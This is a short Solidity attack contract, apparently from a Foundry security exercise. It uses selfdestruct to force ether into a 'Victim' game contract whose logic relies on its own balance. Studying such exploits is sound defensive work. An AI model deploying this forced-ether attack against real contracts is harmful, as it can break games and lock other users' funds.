// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Victim.sol";

contract EthGameAttack is DSTest {
    address payable ethGameAddress;

    constructor(address _ethGameAddress) {
        ethGameAddress = payable(_ethGameAddress);
    }

    function Attack() public {
        require(address(this).balance > 0, "Balance must more than zero to attack game contract");
        selfdestruct(ethGameAddress);
    }
}
